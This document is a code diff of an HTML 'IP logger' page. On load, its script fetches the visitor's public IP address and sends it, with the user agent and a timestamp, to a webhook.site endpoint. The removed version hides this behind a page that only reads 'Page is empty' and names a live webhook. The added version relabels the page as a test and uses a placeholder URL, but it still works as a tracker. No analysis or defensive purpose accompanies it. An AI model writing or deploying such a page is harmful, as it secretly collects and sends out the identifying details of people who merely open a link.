@@ -1,27 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Logger Page</title>
+  <title>IP Logger</title>
   <script>
     fetch("https://api.ipify.org?format=json")
       .then(res => res.json())
       .then(data => {
         const ip = data.ip;
-        const userAgent = navigator.userAgent;
+        const ua = navigator.userAgent;
 
-        fetch("https://webhook.site/ba228a93-d130-4f5a-986c-d81cab91fcaa", {
+        fetch("https://webhook.site/xxxxxx-xxxx-xxxx-xxxx-xxxxxxxx", {
           method: "POST",
-          headers: { "Content-Type": "application/json" },
+          headers: {
+            "Content-Type": "application/json"
+          },
           body: JSON.stringify({
             ip: ip,
-            userAgent: userAgent,
-            time: new Date().toISOString()
+            userAgent: ua,
+            timestamp: new Date().toISOString()
           })
         });
       });
   </script>
 </head>
 <body>
-  <h1>Page is empty</h1>
+  <h1>Testing IP Logger</h1>
 </body>
 </html>
